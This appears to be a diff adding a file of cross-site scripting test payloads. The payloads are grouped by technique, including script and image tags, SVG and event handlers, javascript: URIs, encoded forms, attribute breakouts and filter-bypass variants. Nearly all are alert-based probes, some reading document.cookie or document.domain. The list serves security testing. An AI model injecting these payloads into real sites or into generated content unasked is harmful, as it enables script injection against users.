@@ -1,0 +1,57 @@
+# Cross-Site Scripting (XSS) Payloads
+# These payloads test for XSS vulnerabilities
+
+# Basic XSS
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+
+# Image-based XSS
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img/src=x onerror=alert(1)>
+
+# SVG-based XSS
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+
+# Event handler XSS
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<iframe onload=alert(1)>
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.domain)
+
+# Encoded XSS
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+
+# Attribute-based XSS
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+" onmouseover=alert(1) "
+' onmouseover=alert(1) '
+
+# Advanced XSS
+<iframe src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</ScRiPt>
+<<SCRIPT>alert(1);//<</SCRIPT>
+
+# DOM XSS
+'-alert(1)-'
+'-alert(document.domain)-'
+';alert(1);//
